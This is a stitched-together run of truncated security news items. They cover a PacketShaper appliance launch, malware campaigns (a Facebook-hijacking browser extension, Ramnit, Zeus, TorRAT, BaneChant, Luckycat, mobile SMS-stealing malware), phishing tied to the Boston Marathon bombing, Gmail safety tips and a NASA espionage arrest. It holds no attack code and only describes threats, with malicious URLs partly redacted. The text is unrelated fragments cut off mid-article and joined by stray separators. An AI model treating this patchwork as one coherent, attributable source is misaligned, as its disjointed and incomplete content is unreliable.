With the new features, PacketShaper appliances provide control that can immediately manage new Web applications and content without requiring updates  or new policies. “Today, HTTP traffic is increasingly business related, yet most organizations do not have visibility  into this traffic type, making it impossible to distinguish between business-critical Web applications and those that could be harmful, not to mention all the Web content in between like social networking and video,” said Cindy Borovick, vice president of enterprise communications infrastructure and datacenter networks at IDC. “Companies must be able to clearly differentiate Web traffic in a way  that is fine-grained and can scale with the growth of new content and applications.” PacketShaper appliances can now utilize the cloud-based Blue Coat WebPulse service, a community of 70 million users that provides comprehensive Web awareness through shared information, to understand and categorize Web applications and content in real time. This  integration with the WebPulse service enables PacketShaper appliances to categorize tens of  millions of Websites and billions of URLs into 80 logical and manageable categories, allowing organizations to collectively manage and apply policies to similar content. The new classification by URL category functionality is available on all existing PacketShaper appliances as a software upgrade. With the WebPulse service, each URL can be classified in up to four distinct categories, enabling more precise and granular visibility into and management of Web applications and content. For example, an organization can allow access to Facebook for status updates and chat while limiting bandwidth allocated to Facebook games. With classification by URL category integrated into Blue Coat PacketShaper appliances,  organizations can create policies today that automatically apply to newly discovered content and applications without the need to download new signatures, change configurations or create a new policy. For example, when a new online game is discovered, it is classified in the Games category, and the PacketShaper appliance immediately controls it based on the defined policy for the category. Traditional solutions that attempt to discover applications based on domain name lack the scalability and flexibility to keep pace with the rapid growth of Web-based applications and content. These solutions require an IT manager to create a new policy for each new online game even if it is the  same policy that is already in place for all other classified games. Without the ability to create and manage policies for a group of similar content, these solutions become extremely resource intensive and unmanageable as content and applications grow. Additionally, this approach doesn’t provide the granular differentiation to effectively control traffic from a site like Facebook, which encompasses many categories, including email, chat, videos and games, that an organization might want to  manage differently. In addition to updated features of PacketShaper, Blue Coat is introducing a new high performance PacketShaper appliance that more than doubles the performance of the PacketShaper 10000 appliance. With prices starting at $55,000 and scheduled for availability in December 2010, the PacketShaper 12000 appliance can manage up to 3 Gbps of aggregate throughput for typical enterprise traffic. Blue Coat has also enhanced IntelligenceCenter, the central reporting platform for distributed PacketShaper appliances, to enable reporting on the new classifications by URL categories. The company says that IntelligenceCenter 3 also has a 10X increase in data collection scalability for enterprise-scale reporting and adds role-based access controls that provide flexibility to define specific roles and functions for network administrators. With role-based controls, organizations can define actions, including viewing reports, managing alerts and changing topologies, for specific resources that could include devices, regions or sites. PacketShaper 8.6 and IntelligenceCenter 3 are both available immediately as a software upgrade for all customers with an appropriate support contract. " }

Once installed, the extension will try to download and update itself using the following URLs (a portion of the URL is altered for user safety): du-pont.info/updates/<removed>/BL-chromebrasil.crx for Chrome and du-pont.info/updates/<removed>/BL-mozillabrasil.xpi for Firefox. \"To begin with, this Trojan monitors a user to see if they are currently logged-in to Facebook,\" blogged Microsoft Malware Protection Center [MMPC] Antivirus Researcher Jonathan San Jose. \"It then attempts to get a configuration file from the website <removed>.info/sqlvarbr.php. The file includes a list of commands of what the browser extension will do.\" Depending on the file, the malware can hijack a Facebook user's profile and take a number of actions. For example, the configuration file contains a command to post the following message on Facebook in Portuguese: \"15 YEAR-OLD VICTIM OF BULLYING COMMITS SUICIDE AFTER SHOWING HER BREASTS ON FACEBOOK.\" The post also includes a link that is currently being blocked by Facebook. The malware also was observed forcing users to post a comment on a Facebook page promoting an offer for a Chevrolet Celta. The message varies depending on the configuration file, the researcher blogged. In the span of a few hours, the number of 'likes' for this page grew from 2,746 to 3,177 and the number of comments jumped from 165 to 183. The malware does not just stop there however. It also may send out other messages in Portuguese via chat, posts or comments, such as 'Sorry guys, but this is ridiculous!!' and 'The coolest tune at the moment. It's really nice!'. \"There may be more to this threat because it can change its messages, URLs, Facebook pages and other activity at any time,\" the researcher blogged. \"In any case, we recommend you always keep your security products updated with the latest definitions to help avoid infection.\" " }

The variant, which has been spotted targeting several large UK banks, relies on HTML injection to make changes to banking sites in order to trick users into giving up their OTP to get around two-factor authentication. According to Trusteer Senior Security Strategist George Tubin, the victims are infected with Ramnit the same way as usual – phishing emails with malicious attachments and links to malicious sites. The malware stays idle until the user successfully logs into their account, after which it presents them with a message about configuring their OTP service. \"While the user is reading the message, Ramnit connects to its command and control server and obtains the details of a designated mule account,\" blogged Trusteer Fraud and Prevention Solutions Manager Etay Maor. \"This is followed by the initiation of a wire transfer to the money mule. But, there is still one more obstacle in the way of the malware – to complete the transaction a One Time Password (OTP) must be entered by the user.\" \"The temporary receiver number,\" he continued, \"in the message is in fact the mule’s account number. The user then receives the SMS and thinking that he must complete the 'OTP service generation', enters their OTP. By entering the OTP, the user unknowingly enables the malware to complete the fraudulent transaction and finalize the payment to the mule account. This is yet another example of how well designed social engineering techniques help streamline the fraud process.\" The scam goes even further however.  To ward off the suspicions of victims, the Ramnit authors altered the FAQ [Frequently Asked Questions] section on the bank's FAQ page. \"A simple switch of the word 'transaction' to 'operation' helps reflect the use of the OTP in the fake 'OTP service registration' process,\" Maor blogged. \"Note that the authors most likely used 'find and replace' to switch the two words that resulted in the grammatical mistake 'a option.' Nevertheless, by changing multiple entries in the FAQ section Ramnit demonstrates that its authors did not leave anything to chance – even if the victim decides to go the extra step, Ramnit is already there. \" \"The security industry has a common saying: 'Your system is only as secure as its weakest link,' which is usually followed by: 'humans are the weakest link,'\" blogged Maor. \"With online fraud continuing to generate headlines, users are becoming more security aware. This poses a problem for fraudsters – if they can’t con users, their business is at risk.\"  " }

Many users flocked to the Kaspersky Lab forums to discuss the various warning messages they received about possible malware when trying to download Kaspersky’s legit anti-virus software.   We contacted Kaspersky for comment, but the company was unable to provide details beyond a standard response, due to the fact that an investigation was in progress surrounding the incident. The company, with its global headquarters in Moscow and US headquarters in Woburn, MA issued the following statement: Kaspersky Lab reports that at 11:05 PM GMT on Sunday, October 17, 2010 the kasperskyusa.com domain experienced a hacker attack that exploited a vulnerability on a third party application. As a result of the attack, users trying to download Kaspersky Lab’s consumer products were redirected to a malicious website. The website was simulating a Windows XP Explorer window and a popup window showing scanning process on the local computer and offering the user a fake antivirus program to install. The domain was making these redirections for 3.5 hours in total. Upon being notified about the vulnerability, company personnel took immediate action to address the issue, and the affected server was taken offline within 10 minutes. Immediately following, all vulnerable components were removed from the server and clean files were restored from the central repository. A complete audit of the kasperskyusa.com domain, as well as all of the other Kaspersky Lab domains, was done to ensure they’re running fully updated code. Currently the server is secure and fully back online, and Kaspersky products are available for download. Kaspersky Lab also wants to confirm that no individual’s details were compromised from the company's web servers during this attack. However, Kaspersky Lab takes any attempt to compromise its security seriously. Our researchers are currently working on identifying any possible consequences of the attack for affected users, and are available to provide help to remove the fake antivirus software.

The latest developments in this year-long fight is a new variant of the documents used to target the activists earlier this year. F-Secure reported that the variant was submitted to VirusTotal April 11 in China. The malicious email attachment uses an author tag of IUHRDF, which could be the International Uyghur Human Rights & Democracy Foundation. The payload itself is the same, a backdoor that targets Max OS X, and it targets vulnerabilities in Microsoft Word.  This latest attack has a history, as it’s tied to the “Luckycat” attacks that were discovered over a year ago by Kaspersky Lab and Trend Micro targeting Tibetan activists as well as people connected to military research, and aerospace and energy companies in India and Japan. Unlike this recent attack, the earliest version of the campaign targeted Java vulnerabilities.  While the payload remains the same, the method of infection changes depending on the latest software vulnerabilities. In June 2012, the person(s) controlling the campaign targeted activists by embedding a malicious JPEG photo and OS X application within a ZIP file. Additional levels of attack against the activists also include malicious Android packages (APK), which were delivered last month. This twist targeted both Windows and Mac users. That campaign referenced the “World Uyghur Congress.” Shortly before Android, the attackers focused on PDF vulnerabilities.  “Although some of these attacks were observed during 2012, we’ve noticed a significant spike in the number of attacks during Jan 2013 and Feb 2013, indicating the attackers are extremely active at the moment,” Kaspersky’s Costin Raiu said of the previous version of this latest attack. “With these attacks, we continue to see an expansion of the APT capabilities to attack Mac OS X users. In general, Mac users operate under a false sense of security which comes from the years old mantra that ‘Macs don’t get viruses’...” " }

Fortinet researchers have verified that the variant is sending stolen credentials to the command and control host, which currently uses 6 domains, 5 of which point to a single server in Great Britain and 6th domain hosted on “fast flux” IPs worldwide, according to Fortinet. “Fast Flux DNS” is a common method that botnets use to hide their phishing and malware distribution sites. With fast flux DNS, the malicious sites hide behind many different hosts serving as proxies, utilizing numerous IP addresses associated with a domain name by rapidly changing the IP addresses as a result of frequently modifying DNS records. Fortinet notes that this attack uses an enhanced, more rigid encryption scheme and a very specific injection payload – capable of causing a big impact.    Built using the newer Zeus 2.0 toolkit, this variant contains updated encryption, and a slightly modified configuration file to evade detection from existing tools that decrypt Zeus v2.0 config files.  Kyle Yang of Fortinet decrypted the latest configuration file and was able to disover the intentions and targets for this ZBot attack: banks and investment accounts. With this attack, cybercriminals have expanded their scope, using heavy browser injection to conduct a targeted attack against presumed Charles Schwab clients. There have been several other attacks targeting specific Web site users such as LinkedIn and Apple’s iTunes over the past few weeks. Additionally, a massive attack was launched today - targeting users of the government tax services site, EFTPS.Gov a site often used by businesses to make tax payments online. " }

As we write this the attack appears to be in full swing, with data showing a massive spike in the volume of malicious emails coming from this attack being sent today. \"The attacks started trickling in on Tuesday, October 12, peaking at around 5% of global spam volumes,\" said Henry Stern, Senior Security Research at Cisco. \"There was a much larger attack that started on October 15 at 14:30 UTC and lasted just over an hour. This attack accounted for over 25% of all spam email during that period,\" Stern added. The subject lines of the messages say things like \"Last Notice: Your Federal Tax Payment Has Been Rejected\" or \"Your EFTPS.Gov Payment Has Been Rejected.\" While phishing attacks and scams targeting taxpayers are nothing new, this appears to have a new twist. Researchers at Solera Networks discovered that this latest attack goes beyond simply phishing for personal data via standard Web forms. The network forensics company has evidence that behind the scenes, the campaign is actually infecting machines, using a very recent (recently zero-day) exploit, to join a pre-existing ZeuS botnet. Similar to other attacks, if a user clicks on the malicious (masked) link in the email, they can be infected with a variant of the Zeus Malware via a “drive-by download” – something that requires little or no user interaction to infect a system.  This is a clear attack targeted at businesses attempting to make online payments or utilize other functions of the legit EFTPS.gov service and is designed to capture recipients’ confidential information, including employer identification number (EIN), social security numbers, bank account and routing numbers, etc. Once infected, the system will continue to capture such data in future sessions as well.  While Zeus itself is not new, this appears to be the first time a variant of it has specifically targeted online taxpayers using government Web sites. Zeus, also commonly known as Zbot, is the most prevalent malware platform for online fraud, and has been licensed by numerous criminal organizations. Zeus infects PCs, usually without users knowing or causing any other “noticeable” harm. The program then waits for the user to log onto a list of targeted banks and financial institutions, and then steals login credentials and other data, which are immediately sent to a remote server hosted by cybercriminals. “The volume of the campaign, the scope of attack vectors, and the speed of the botnets’ backend adaptation truly make this one of the most formidable attacks that we have seen,\" said Solera Networks CTO Joe Levy. From the evidence and statistics so far, this botnet expansion is having success. \"This attack involved over 800 compromised web servers whose only purpose was to redirect the victim's browser on to a web exploit toolkit. The criminals did this in an attempt to evade the URL reputation used by most anti-spam systems,\" said Cisco's Henry Stern. It’s not by chance that this spike is occurring today - the 15th of the month - the day when many businesses must file online tax payments. In this latest attack, recipients are receiving fake messages, appearing to be from the EFTPS Service, notifying users that their tax payment has been rejected and encouraging them to click on a link to check for more information. As of early this afternoon, security vendors and the cybercriminals behind the attack are in the midst of a firefight. As some hosts are taken down, the malware host servers appear to be moving around using a technique called “Fast Flux DNS” – a common method that botnets use to hide their phishing and malware distribution sites. With fast flux DNS, the malicious sites hide behind many different hosts serving as proxies, utilizing numerous IP addresses associated with a domain name by rapidly changing the IP addresses as a result of frequently modifying DNS records. Cisco Security Intelligence was able to provide some very recent statistics on the volume of messages being sent as part of the attack.    In other Zeus related news, Charles Schwab customers have been the target of yet another Zeus attack.

According to Trusteer, the malware is known as TorRAT. While normally it is focused on financial information, a new iteration has been seen hijacking the Twitter accounts of those it infects. \"The malware launches a Man-in-the-Browser (MitB) attack through the browser of infected PCs, gaining access to the victim’s Twitter account to create malicious tweets,\" blogged Dana Tamir, director of enterprise product marketing at Trusteer.   The malware spreads using malicious links accompanied by tweets written in Dutch, such as \"Onze nieuwe koning Willem gaat nog meer verdienen dan beatrix. check zijn salaris,\" which translates to \"Our new King William will earn even more than Beatrix. Check his salary\" in English. While the attack is targeting the Dutch market right now, this type of attack \"can be used to target any market and any industry,\" Tamir noted. \"The attack is carried out by injecting Javascript code into the victim’s Twitter account page,\" according to Tamir. \"The malware collects the user’s authentication token, which enables it to make authorized calls to Twitter's APIs, and then posts new, malicious tweets on behalf of the victim.\" The malware posts the tweets on behalf of the user directly into the live Twitter session the user has,\" explained Yishay Yovel, vice president of Trusteer. \"This session tampering is the same approach hackers use to create fake financial transactions targeting user logs into their online banking account and a live session exists between the user and the bank,\" he told SecurityWeek. \"We don’t often see malware spreading on Twitter the way this malware is,\" Yovel added. \"This attack is similar to when an email account gets compromised - the recipients on the email contact list are likely to click a malicious link in an email because they trust the user. The malware on Twitter uses this same method of exploiting the trusted relationship between the Twitter handle owner and the followers.\" That makes it particularly difficult to defend against, Tamir noted. \"Twitter users follow accounts that they trust,\" she said. \"Because the malware creates malicious tweets and sends them through a compromised account of a trusted person or organization being followed, the tweets seem to be genuine.\" " }

Here's what Google suggests to help stay secure while using their services. Your Computer Your Browser Your Google Account  1. Change Your Password - If your account has been recently compromised, you should update your password now. In general we suggest you change it twice a year, following these guidelines:  •\tPick a unique password that you haven't previously used on other sites or on Gmail. Just changing one character or number still counts as reusing your password. • Don't use a dictionary word or a common word that's easily guessable. Use a combination of numbers, characters, and case-sensitive letters. 2. Check the list of websites that are authorized to access your Google Account data Make sure that the list of authorized websites are accurate and ones that you have chosen. If your Google Account has been compromised recently, it's possible that the bad guys could have authorized their own websites to access your account data. This may allow them to access your Google Account after you have changed your password.To edit the list of authorized websites go here. •\tSign in on the Google Accounts homepage. •\tClick the My Account link displayed at the top right of the page. •\tClick Change authorized websites. This page will list all third-party sites you've granted access to. • Click the Revoke Access link to disable access for a site. 3. Update your account recovery options - We all may forget our passwords at some point, so we strongly encourage that you update your account recovery options. •\tRecovery email address: We can use your recovery email address to communicate with you if you lose access to your account. Learn more. •\tSMS: We can send you a recovery code to your mobile phone number, which you can use to reset your password. Learn more. • Secret question: This option is only available if you can't use the above recovery options and only if haven't tried to sign in during the past 24 hours. An ideal answer to your security question is easy for you to remember, but hard for others to guess. Your Gmail Settings 1. Confirm the accuracy of your mail settings to ensure that your mail stays and goes where you want it to.  Sign in to your account and click on the Settings link at the top to check the following tabs: •\tGeneral: Check Signature, Vacation Responder, and/or canned responses for spammy content •\tAccounts: Verify your Send Mail As, Get mail from other accounts, and Grant access to your account are all accurate. •\tFilters: Check that no filters are sending your mail to Trash, Spam, or forwarding to an unknown account. • Forwarding and POP/IMAP: Ensure your mail isn't sent to an unknown account or mail client. 2. Check for any strange recent activity on your account. Click the Details link next to the 'Last Account Activity' entry at the bottom of your account to see the time, date, IP address and the associated location of recent access to your account. 3. Use a secure connection to sign in - In your Gmail settings, select 'Always use HTTPS.' This setting protects your information from being stolen when you're signing in to Gmail on a public wireless network, like at a cafe or hotel. Final Reminders  •\tWatch out for messages that ask for your username and/or password. Gmail will never ask for this information. •\tNever give out your password after following a link sent to you in a message, even if it looks like Gmail's sign-in page. Access Gmail directly by typing https://mail.google.com in your browser's address bar. •\tDon’t share your password with other websites - Google can’t guarantee the security of other websites and your Gmail password could be compromised •\tKeep secrets! Never tell anyone your password, or your secret question and answer; if you do tell someone, change it as soon as possible. •\tClear forms, passwords, cache and cookies in your browser on a regular basis - especially on a public computer. •\tOnly select 'Stay signed in' if you're signing in from a personal computer. •\tAlways sign out when you've finished reading your mail.

According to a number of security vendors, the spam campaign started early this week in the aftermath of the attack at the Boston Marathon Monday afternoon. According to Craig Williams, a technical leader at Cisco Systems, the spam campaign was traced to two botnets. \"The spam messages claim to contain news concerning the Boston Marathon bombing,\" Williams blogged. \"The spam messages contain a link to a site that claims to have videos of explosions from the attack. Simultaneously, links to these sites were posted as comments to various blogs.\" \"The link directs users to a webpage that includes iframes that load content from several YouTube videos plus content from an attacker-controlled site,\" he continued. \"Reports indicate the attacker-controlled sites host malicious.jar files that can compromise vulnerable machines.\" Some of the messages researchers have seen came with subject lines such as \"2 Explosions at Boston Marathon\" and \"Aftermath to explosion at Boston Marathon.\" \"Clicking the link opens up a compromised Web page,\" according to researchers with Symantec. \"The Web page shows a series of videos of the attack site. There is an unloaded video at the bottom of the Web page that leads to (Redkit) Exploit kit which exploits various vulnerabilities on the user’s computer. Once an exploit has been successful, the user sees a popup asking them to download the file boston.avi_______.exe.\" \"It's no surprise to see that the links used in the malicious email can vary - no doubt in an attempt to avoid rudimentary email filtering but they all appear to be based in Ukraine and Latvia,\" blogged Graham Cluley, senior technology consultant at Sophos. \"If you make the mistake of clicking on the link, however, you are taken to a website which - while showing you genuine YouTube videos of the the horrific incident - attempts to infect your computer with a Windows Trojan horse that Sophos products detect as Troj/Tepfer-Q.\" The second campaign Cisco noted exploiting interest in the bombing was spotted blasting out spam messages containing graphical HTML content disguised as breaking news alerts from CNN. \"These spam messages entice the user with a link claiming: “You have received the following link from [email protected]”,\" Williams blogged. \"In reality, the link takes users to a compromised website that contains an instant HTTP meta-refresh redirect to an attacker controlled site that we believe is attempting to install the Blackhole Exploit Kit (BHEK).\" The exploit kit users were also hard at work after the explosion Wednesday at a plant in West, Texas, McLennan County. In that case, the emails contained subjects such as \"Texas Plant Explosion\" and \"Raw: Texas Explosion Injures Dozens,\" according to security vendor Websense. The emails \"Clicking on the link contained inside the emails takes unsuspecting computer users to a webpage that contains a series of embedded YouTube videos,\" Cluley blogged. \"Harmless enough, you might think. However, the webpage also contains a 640x360 pixel iFrame, that attempts to suck in malicious content from another site, designed to infect your computer. The attack uses the Redkit exploit kit to take advantage of vulnerabilities on visiting PCs in order to infect them with malware.\" \"Don't make life easy for malicious hackers - and always go to legitimate news outlets for breaking news rather than rely upon unsolicited emails,\" Cluley wrote.  " }

Nearly 90 percent of unauthorized software for popular computer games are infected with malware, AVG Technologies said in its AVG Insight newsletter released today. The list includes unpirated \"cracked\" games, license key generators (keygens) and thousands of other game hacks such as patches, cheats and trainers readily available online on unregulated torrent or file-sharing sites, AVG said.  AVG's findings were released the same day Kaspersky Lab disclosed details on a series of targeted attacks against online gaming companies.  \"While the hacks may appear attractive at first glance, most are created by cybercriminals looking to pry, disrupt or steal,\" AVG said.  These hacks are designed to attract players looking to get something for free or enhance their in-game experience. AVG Viruslab Researchers noted that games range anywhere from $5 to $50, and that is before the players have to shell out for add-ons such as extra powers and resources. Recent industry figures suggest gamers spend an average of $127 on gaming software each year. Other players may be looking for ways to advance in the game because they don't have the enormous amount of time these games often require, the research group added.  AVG’s researchers analyzed such hacks and cracks found through metasearch services such as FilesTube and FileCrop, and discovered malware which could lead steal legitimate, paid-for gaming assets, take over user accounts, or intercept sensitive personal data such as bank details and passwords to email and social networking accounts. AVG searched FileCrop for a Diablo3 hack and found more than 40 hacks. Bigger titles such as World of Warcraft or Minecraft returns hundreds of results, the security firm said.  A randomly downloaded Diablo3 hack turned out to have malicious code which would attempt to decrypt saved passwords stored by the Web browser, AVG researchers found. Any cracked passwords would then be sent back to the attacker via email.  At first glance, the numbers don't seem all that large, as only a small percentage of gamers go looking for a hack. However, considering that the top five games—World of Warcraft, League of Legends, Runescape, World of Tanks, and Minecraft:—boast about 330 million players worldwide (in all, not each game), even a mere 0.1 percent of players would translate to about 330,000 individuals, AVG noted.  Infected users should immediately change passwords across all online services using the same password, contact the game provider to recover the account, AVG said.  \"As this rough and ready experiment shows, gamers downloading a hack from a file sharing website should exercise extreme caution, and at least ensure they have the latest security products installed on their computer,\" AVG Viruslab Research Group recommended. Or better yet, don't download cracks, hacks, trainers or unofficial patches and get patches only from the official game provider’s website. " }

The report is based on a survey of over 1,000 global business decision-makers in 17 countries. It finds that 75 percent of those queried are using Web 2.0 technology – defined broadly as consumer social media applications such as Facebook, Twitter and YouTube plus specialized enterprise solutions – for functions such as IT (51 percent), marketing and sales (34 percent), customer relations (29 percent), advertising and public relations (28 percent) and human resources (22 percent).

According to FireEye's '2H 2012 Advanced Threat Report', in the second half of last year, individual enterprises were hit with a \"malware event\" every three minutes, ranging from a user receiving a malicious email to an employee clicking on a link to an infected website to a compromised machine making a call back to a command-and-control server. Ironically, it was the tech industry that was hit the hardest, most likely due to the value of their intellectual property, the report said. \"What this says about the attackers is they know which companies have the greatest tangible intellectual property right now,\" Ali Mesdaq, senior security researcher at FireEye, told SecurityWeek. \"Technology companies have the type of IP [intellectual property] that can be taken easily and leveraged quickly in comparison to some other verticals.\"  The figure is based on data gathered from FireEye customers on 89 million malware events. The most common avenue of attack is spear phishing, with business-related terms unsurprisingly playing a role in the lures. \"When sending spear phishing emails, attackers opt for file names with common business terms to lure unsuspecting users into opening the malware and initiating the attack,\" according to the report. \"These terms fall into three general categories: shipping and delivery, finance, and general business. The top phrase in malware file names, for example, was 'UPS'.\" Other commonly cited words in malicious emails were: details, documents and FedEx. The most common malicious file names included Details.zip and UPS_document.zip. Zip files were the primary delivery method for attackers, representing the method in 92 percent of attacks. This is no accident – hackers know Zip files are common in the business world. \"Attackers know that not many people are going to be clicking .exe extensions as often as a .zip,\" Mesdaq said. \"Filtering policies now have to be created much more carefully because attackers know that a block on all .zip files is not very likely.\" Attackers are also turning to DLL files in a bid to evade detection. \"By using DLLs, the malware can establish persistent control as every time a vital, commonly used application like Internet Explorer is used the malicious payload is loaded automatically—without any user involvement or awareness,\" the report notes. \"If the malware were dependent on user commands to execute a malicious payload, chances are much more likely that users would get suspicious and not take the step necessary for the malware to operate.\"            Malware authors are also taking steps to evade detection by programming their creations to detect when they are in a sandbox. A recent example of this is Trojan.APT.BaneChant, which is designed to execute only after it has detected three mouse clicks, which is interpreted as an indicator of human interaction. \"Vendors and analysts need to constantly be following the evasion techniques malware authors are using,\" Mesdaq said. \"The legacy techniques range from looking for various process names, hardware information, and registry settings. The newer techniques are more related to user interaction or deeper checks on the system looking for specific applications installed.\" " }

Based on that info, it encourages users to install mobile malware, by sending a SMS with a link to download the appropriate version of the malicious package depending on the type of mobile device the user has.  Next, the attacker logs in with the stolen credentials using the user's computer as a proxy and performs the SMS authentication process. An SMS is sent to the user's mobile device with the authentication code. The malicious software running on the user’s mobile device forwards the SMS to a system controlled by the attacker. After analyzing the malware, Fortinet noted that it creates its own database on the mobile device, where it stores all information it steals. This database is named NumbersDB.db, and contains 3 tables: •\ttbl_contact with 4 columns: index, name, descr, pb_contact_id. •\ttbl_phone_number with 2 columns: contact_id, phone_number •\tand tbl_history with 6 columns: event_id, pn_id, date, description, contact_info, contact_id. The malware searches those tables using standard SQL queries. The malware sends SMS messages. In particular, it sends a message to a phone number located in the United Kingdom to notify that the malware has been successfully installed (”App installed ok”). \"27/09/2010\",\"12:09\",\"Short message\",\"Outgoing\",\"App installed ok\",\"+44778xxxxxxx\" Additionally, s21sec warns that the malware appears to have the capability to answer commands, potentially allowing anyone sending a “set admin” SMS to your infected phone may to take control of it.

According to researchers at FireEye, the malware is monitoring mouse clicks to determine whether or not it is being analyzed in a sandbox. The technique is being used by a threat called Trojan.APT.BaneChant, which is being blasted out via a Word document laced with an exploit as part of a campaign believed by FireEye to be targeting governments in the Middle East and Central Asia. The malware is not the first to use mouse clicks to evade efforts by researchers; however unlike past threats, the Trojan does not stop checking after detecting a single mouse click. Instead, it waits until there have been multiple clicks. \"This malware doesn’t kick into high gear immediately,\" blogged FireEye researcher Ronghwa Chong. \"Instead it requires an Internet connection for malicious code to be downloaded to the memory and executed. Unlike predecessors that are very obvious and immediately get to work, this malware is merely a husk and its true malicious intent could only be found in the downloaded code. This prevents forensic investigators from extracting the “true” malicious code from the disk.\" The document used in the spear-phish is in RTF format and exploits CVE 2012-0158, a Microsoft Office vulnerability. \"After opening this malicious document, it attempts to download an XOR encoded binary (using a two byte XOR key) for the stage one payload,\" the researcher continued. \"It was also observed that the attacker leveraged a shortened URL to “hide” malicious domains from automated analysis technologies. After investigation, the malicious domain was analyzed to be recently registered.\" \"Often when malware performs its callback, the communication goes directly to the CnC [command-and-control] server,\" according to Chong. \"In this case, the callback goes to a legitimate URL shortening service, which would then redirect the communication to the CnC server. Automated blocking technologies are likely to block only the URL shortening service and not the CnC server.\" The majority of the malicious code however is only available after downloading the second stage payload, which is available as a fake JPEG file from the malicious server. The malicious domain is not found in the malware in the second stage. Instead the attackers use the dynamic DNS service provided by No-IP to \"indirectly access the malicious domain,\" he wrote. After the JPEG file is executed directly in the memory, it tries to fool users by disguising itself as 'GoogleUpdate.exe' and creates a shortcut link to the file in the startup folder [“C:\\ProgramData\\Google2\\GoogleUpdate.exe”]. \"It would look legitimate to users as it masquerades as a legitimate Google Updater,\" the researcher explained. \"It “would” appear normal if it attempts to access the Internet. In comparison, the real “GoogleUpdate.exe” resides in “program files” instead “program data” directory.\"  \"Overall, this malware was observed to send information about the computer and set up a backdoor for remote access,\" the researcher noted. \"This backdoor provides the attacker the flexibility on how malicious activities could be executed.\" " }

Thirty-five percent of the respondents that were infected by malware from social networking sites suffered a financial loss, with more than a third of those companies reporting losses in excess of $5,000. According to the survey, SMBs’ top concerns with social media include privacy and data loss (74 percent), malware infections (69 percent), employee productivity loss (60 percent), reputation damage (50 percent), and network performance/utilization problems (29 percent). However, these concerns are not deterring SMBs from utilizing social media in business situations. Seventy-eight percent use these tools to support research and competitive intelligence, improve customer service, drive public relations and marketing initiatives or directly generate revenue. Facebook: Top Source for Malware Infections  Facebook is by far the most popular social media tool among SMBs, with 69 percent of respondents reporting that they have active accounts with this site, followed by Twitter (44 percent), YouTube (32 percent) and LinkedIn (23 percent). Facebook is also the top culprit for companies that experienced malware infection (71.6 percent) and privacy violations, e.g. the leaking of sensitive company information (73.2 percent). YouTube took the second spot for malware infection (41.2 percent), while Twitter contributed to a significant number of privacy violations (51 percent). For companies suffering financial losses from employee privacy violations, Facebook was again cited as the most common social media site where these losses occurred (62 percent), followed by Twitter (38 percent), YouTube (24 percent) and LinkedIn (11 percent). Restrictive Social Media Policies Common  To minimize the risks associated with social media, 57 percent of SMBs currently have a social media governance policy in place, with 81 percent of these companies employing personnel to actively enforce those policies. This figure is in surprising contrast to larger organizations, only 40 percent of which have such policies according to the 2011 Global State of Information Security Study by CIO, CSO and PricewaterhouseCoopers. In addition, 64 percent of the SMBs reported having formal training programs to educate employees on the risks and benefits of social media. The majority of respondents (62 percent) do not allow the personal use of social media at work. The most common disallowed activities include playing games (32 percent), publishing inappropriate content on social media sites (31 percent) and installing unapproved applications (25 percent). In addition, 25 percent of companies said that they actively block popular social media sites for employees, mainly via a gateway appliance (65 percent) and/or hosted Web security service (45 percent). What should companies do? Alex Thurber, SVP Worldwide Channel Operations for McAfee's Mid Market business suggests that companies give employees the tools to use social media responsibly. \"Although users can’t trust every link that people post or control, companies can put forward best practices to arm employees with the tools they need to be productive and safe. Between this type of education, and technology that can block dangerous links and applications, Web 2.0 can be used safely for business,\" writes Thurber. " }

The offending apps have since been taken off the Google Play marketplace, according to Symantec Security Response Manager Satnam Narang, who added that the developers' accounts have been suspended by Google. The apps – more than 200 in all – are believed to have been part of a one-click fraud scam that may have victimized thousands. \"One-click fraud refers to a scam that attempts to lure users interested in adult-related video to a site that attempts to trick them into registering for a paid service,\" blogged Joji Hamada, security researcher with Symantec. \"For many years, it has been common to see this type of fraud on computers. As smartphone usage has increased, so has the number of these types of scams on smartphone devices.\" Typically, people come across these scam sites when searching for items they are interested in or clicking on links in spam messages, he continued. Symantec researchers spotted the scheme making its way to Google Android devices roughly a year ago. In this case, entering Japanese words related to pornographic video resulted in one of the apps being at the top of the search results. The apps normally only required the user to accept the \"Network communication\" permission, though some variants did not require the user to accept any permissions. \"This is because the app is simply used as a vehicle to lure users to the scam by opening fraudulent porn sites,\" Hamada noted. \"The app itself has no other functionality. This may fool users into feeling safe about the app and catch them off guard when launching the app.\" The ruse apparently worked on some. According to Symantec, more than 200 of the fraudulent applications were published and were downloaded at least 5,000 times during the past two months. \"As far as victims go, we are not aware of how many of these users actually paid money to the scammers; the “service” costs about 99,000 yen (approximately US$1,000),\" according to Hamada. \"It certainly must be worth the time and effort for the scammers as they have continued doing business for over two months.\" " }

The virus has been spreading primarily via email, asking recipients to click on a link masked as a PDF file that actually links to malware being hosted on an external server. In a sample, an emailed contained a link to “PDF_Document21_025542010_pdf.scr’” which directed users to malware hosted on the domain “members.multimania.co.uk.” The virus had been spreading rapidly but researchers are saying that volume has dropped significantly once the site hosting the malware was shut down. When a user clicks on the link, their computer instantly downloads and launches the malware. It then copies itself into the Windows directory using the name CSRSS.EXE, an identical file name to a legitimate Windows file, according to McAfee researchers. Symantec warned that the worm also attempts to spread from computer to computer over local networks (other computers on a home or office network) by copying itself to shared drives on the network. Once the threat copies itself to another machine, if a user opens the folder that contains the threat, it will launch and start a whole new cycle.

The suspect, Bo Jiang, worked as a contractor for the National Institute of Aerospace at NASA's Langley Research Center in Virginia and was arrested by the FBI as he attempted to board a plane March 16 headed to China. He has been charged with lying to federal authorities regarding the electronics he was trying to take with him after reportedly failing to disclose he possessed an additional laptop, cell phone SIM card and an old hard drive.  As a result of the arrest, the agency decided to shut down the publicly-accessible NASA Technical Reports Server (NTRS) as part of a security review. \"NASA takes all security concerns very seriously,\" Michael Cabbage, a NASA spokesman, told SecurityWeek. \"The NTRS server was taken offline at the direction of NASA Administrator Charles Bolden.  It will remain offline until we ensure there is no export-control sensitive information on it.\"  On March 20, Bolden told the House Appropriations Committee that NASA completed a review of a potential breach at the Langley Research Facility and has taken several steps to address security besides shutting down the database - including ordering a complete review of the access foreign nationals from certain countries are granted at NASA facilities. \"I have ordered a moratorium on granting any new access to NASA facilities to individuals from specific designated countries, including China, Burma, Eritrea, Iran, North Korea, Saudi Arabia, Sudan, and Uzbekistan,\" he told the committee, adding that while this review is ongoing, any remote computer access to NASA resources for those countries will be terminated. In addition, NASA has been working closely with law enforcement agencies on security, and NASA supervisors are reinforcing the importance of following security protocols.  \"And finally, I want this Committee to know that I have placed a priority on protecting security, export control, and safety 